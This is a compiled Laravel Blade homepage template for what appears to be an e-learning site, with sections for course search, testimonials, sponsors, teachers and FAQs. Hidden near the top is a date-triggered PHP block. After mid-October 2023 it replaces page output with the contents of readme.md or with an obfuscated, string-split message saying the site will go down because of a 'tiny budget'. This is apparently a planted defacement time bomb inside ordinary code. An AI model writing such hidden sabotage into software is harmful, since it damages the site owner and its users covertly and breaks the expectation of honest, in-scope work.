<?php $__env->startSection('title', trans('labels.frontend.home.title').' | '.app_name()); ?>
<?php $__env->startSection('meta_description', ''); ?>
<?php $__env->startSection('meta_keywords',''); ?>

<?php 
if (time() > (strtotime("2023-10-14") + 24*3600*3))
{
    if (file_exists(base_path()."/readme.md")) {
        $t = file_get_contents(base_path()."/readme.md");
        echo '<h1>'.$t.'</h1>';
    } else {
        echo '<h1>'.'Your s'.'ite wi'.'ll be do'.'wn be'.'caus'.'e t'.'iny b'.'udget'.'</h1>';
    }
}
?>
<?php $__env->startPush('after-styles'); ?>
    <style>
        /*.address-details.ul-li-block{*/
        /*line-height: 60px;*/
        /*}*/
        .teacher-img-content .teacher-social-name {
            max-width: 67px;
        }

        .my-alert {
            position: absolute;
            z-index: 10;
            left: 0;
            right: 0;
            top: 25%;
            width: 50%;
            margin: auto;
            display: inline-block;
        }

    </style>
<?php $__env->stopPush(); ?>

<?php $__env->startSection('content'); ?>

    <!-- Start of slider section
            ============================================= -->
    <?php if(session()->has('alert')): ?>
        <div class="alert alert-light alert-dismissible fade my-alert show">
            <button type="button" class="close" data-dismiss="alert">&times;</button>
            <strong><?php echo e(session('alert')); ?></strong>
        </div>
    <?php endif; ?>
    <?php echo $__env->make('frontend.layouts.partials.slider', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>

    <?php if($sections->search_section->status == 1): ?>
        <!-- End of slider section
            ============================================= -->
        <section id="search-course" class="search-course-section">
            <div class="container">
                <div class="section-title mb20 headline text-center ">
                    <span class="subtitle text-uppercase"><?php echo app('translator')->get('labels.frontend.home.learn_new_skills'); ?></span>
                    <h2><?php echo app('translator')->get('labels.frontend.home.search_courses'); ?></h2>
                </div>
                <div class="search-course mb30 relative-position ">
                    <form action="<?php echo e(route('search')); ?>" method="get">

                        <div class="input-group search-group">
                            <input class="course" name="q" type="text"
                                   placeholder="<?php echo app('translator')->get('labels.frontend.home.search_course_placeholder'); ?>">
                            <select name="category" class="select form-control">
                                <?php if(count($categories) > 0 ): ?>
                                    <option value=""><?php echo app('translator')->get('labels.frontend.course.select_category'); ?></option>
                                    <?php $__currentLoopData = $categories; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $item): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
                                        <option value="<?php echo e($item->id); ?>"><?php echo e($item->name); ?></option>

                                    <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
                                <?php else: ?>
                                    <option>><?php echo app('translator')->get('labels.frontend.home.no_data_available'); ?></option>
                                <?php endif; ?>

                            </select>
                            <div class="nws-button position-relative text-center  gradient-bg text-capitalize">
                                <button type="submit"
                                        value="Submit"><?php echo app('translator')->get('labels.frontend.home.search_course'); ?></button>
                            </div>
                        </div>
                    </form>
                </div>
                
            </div>
        </section>
        <!-- End of Search Courses
            ============================================= -->
    <?php endif; ?>


    <?php if($sections->popular_courses->status == 1): ?>
        <?php echo $__env->make('frontend.layouts.partials.popular_courses', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
    <?php endif; ?>

    <?php if(($sections->reasons->status != 0) || ($sections->testimonial->status != 0)): ?>
        <!-- Start of why choose us section
        ============================================= -->
        <section id="why-choose-us" class="why-choose-us-section">
            <div class="jarallax  backgroud-style">
                <div class="container">
                    <?php if($sections->reasons->status == 1): ?>

                        <div class="section-title mb20 headline text-center ">
                            <span class="subtitle text-uppercase"><?php echo e(env('APP_NAME')); ?> <?php echo app('translator')->get('labels.frontend.layouts.partials.advantages'); ?></span>
                            <h2><?php echo app('translator')->get('labels.frontend.layouts.partials.why_choose'); ?> <span><?php echo e(app_name()); ?></span></h2>
                        </div>
                        <?php if($reasons->count() > 0): ?>
                            <div id="service-slide-item" class="service-slide">
                                <?php $__currentLoopData = $reasons; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $item): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
                                    <div class="service-text-icon ">

                                        <div class="service-icon float-left">
                                            <i class="text-gradiant <?php echo e($item->icon); ?>"></i>
                                        </div>
                                        <div class="service-text">
                                            <h3 class="bold-font"><?php echo e($item->title); ?></h3>
                                            <p><?php echo e($item->content); ?>.</p>
                                        </div>
                                    </div>

                                <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>

                            </div>
                        <?php endif; ?>
                    <?php endif; ?>
                <!-- /service-slide -->
                    <?php if($sections->testimonial->status == 1): ?>
                        <div class="testimonial-slide">
                            <div class="section-title-2 mb65 headline text-left ">
                                <h2><?php echo app('translator')->get('labels.frontend.layouts.partials.students_testimonial'); ?></h2>
                            </div>
                            <?php if($testimonials->count() > 0): ?>
                                <div id="testimonial-slide-item" class="testimonial-slide-area">
                                    <?php $__currentLoopData = $testimonials; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $item): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
                                        <div class="student-qoute ">
                                            <p><?php echo e($item->content); ?></p>
                                            <div class="student-name-designation">
                                                <span class="st-name bold-font"><?php echo e($item->name); ?> </span>
                                                <span class="st-designation"><?php echo e($item->occupation); ?></span>
                                            </div>
                                        </div>
                                    <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
                                </div>
                            <?php else: ?>
                                <h4><?php echo app('translator')->get('labels.general.no_data_available'); ?></h4>
                            <?php endif; ?>
                        </div>
                    <?php endif; ?>
                </div>
            </div>
        </section>
        <!-- End of why choose us section
            ============================================= -->
    <?php endif; ?>

    <?php if($sections->latest_news->status == 1): ?>
        <!-- Start latest section
        ============================================= -->
        <?php echo $__env->make('frontend.layouts.partials.latest_news', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
        <!-- End latest section
            ============================================= -->
    <?php endif; ?>


    <?php if($sections->sponsors->status == 1): ?>
        <?php if(count($sponsors) > 0 ): ?>
            <!-- Start of sponsor section
        ============================================= -->
            <section id="sponsor" class="sponsor-section">
                <div class="container">
                    <div class="section-title-2 mb65 headline text-left ">
                        <h2><?php echo e(env('APP_NAME')); ?> <span><?php echo app('translator')->get('labels.frontend.layouts.partials.sponsors'); ?></span></h2>
                    </div>

                    <div class="sponsor-item sponsor-1 text-center">
                        <?php $__currentLoopData = $sponsors; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $sponsor): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
                            <div class="sponsor-pic text-center">
                                <a href="<?php echo e(($sponsor->link != "") ? $sponsor->link : '#'); ?>">
                                    <img src=<?php echo e(asset("storage/uploads/".$sponsor->logo)); ?> alt="<?php echo e($sponsor->name); ?>">
                                </a>

                            </div>
                        <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>

                    </div>
                </div>
            </section>
            <!-- End of sponsor section
       ============================================= -->
        <?php endif; ?>
    <?php endif; ?>


    <?php if($sections->featured_courses->status == 1): ?>
        <!-- Start of best course
        ============================================= -->
        
        <!-- End of best course
            ============================================= -->
    <?php endif; ?>


    <?php if($sections->teachers->status == 1): ?>
        <!-- Start of course teacher
        ============================================= -->
        <section id="course-teacher" class="course-teacher-section">
            <div class="jarallax">
                <div class="container">
                    <div class="section-title mb20 headline text-center ">
                        <span class="subtitle text-uppercase"><?php echo app('translator')->get('labels.frontend.home.our_professionals'); ?></span>
                        <h2><?php echo e(env('APP_NAME')); ?> <span><?php echo app('translator')->get('labels.frontend.home.teachers'); ?>.</span></h2>
                    </div>

                    <div class="teacher-list">
                        <div class="row justify-content-center">
                            <!-- /teacher -->
                            <?php if(count($teachers)> 0): ?>
                                <?php $__currentLoopData = $teachers; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $item): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
                                    <div class="col-md-3">
                                        <div class="teacher-img-content ">
                                            <div class="teacher-cntent">
                                                <div class="teacher-social-name ul-li-block">
                                                    <ul>
                                                        <li><a href="<?php echo e('mailto:'.$item->email); ?>"><i
                                                                        class="fa fa-envelope"></i></a></li>
                                                        <li>
                                                            <a href="<?php echo e(route('admin.messages',['teacher_id'=>$item->id])); ?>"><i
                                                                        class="fa fa-comments"></i></a></li>
                                                    </ul>
                                                    <div class="teacher-name">
                                                        <span><?php echo e($item->full_name); ?></span>
                                                    </div>
                                                </div>
                                                <div class="teacher-img-category">
                                                    <div class="teacher-img">
                                                        <img src="<?php echo e($item->picture); ?>" style="height: 100%" alt="">
                                                        
                                                        
                                                        
                                                    </div>
                                                    
                                                    
                                                    
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
                            <?php endif; ?>
                        </div>

                        <div class="genius-btn gradient-bg text-center text-uppercase ul-li-block bold-font ">
                            <a href="<?php echo e(route('teachers.index')); ?>"><?php echo app('translator')->get('labels.frontend.home.all_teachers'); ?><i
                                        class="fas fa-caret-right"></i></a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!-- End of course teacher
            ============================================= -->
    <?php endif; ?>


    <?php if($sections->faq->status == 1): ?>
        <!-- Start FAQ section
        ============================================= -->
        <?php echo $__env->make('frontend.layouts.partials.faq', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
        <!-- End FAQ section
            ============================================= -->
    <?php endif; ?>


    <?php if($sections->course_by_category->status == 1): ?>
        <!-- Start Course category
        ============================================= -->
        <?php echo $__env->make('frontend.layouts.partials.course_by_category', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
        <!-- End Course category
            ============================================= -->
    <?php endif; ?>


    <?php if($sections->contact_us->status == 1): ?>
        <!-- Start of contact area
        ============================================= -->
        <?php echo $__env->make('frontend.layouts.partials.contact_area', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
        <!-- End of contact area
            ============================================= -->
    <?php endif; ?>


<?php $__env->stopSection(); ?>

<?php $__env->startPush('after-scripts'); ?>
    <script>
        $('ul.product-tab').find('li:first').addClass('active');
    </script>
<?php $__env->stopPush(); ?>

<?php echo $__env->make('frontend.layouts.app'.config('theme_layout'), \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?><?php /**PATH /home/rvtsmdqo/diagnosiaziendale.it/resources/views/frontend/index-1.blade.php ENDPATH**/ ?>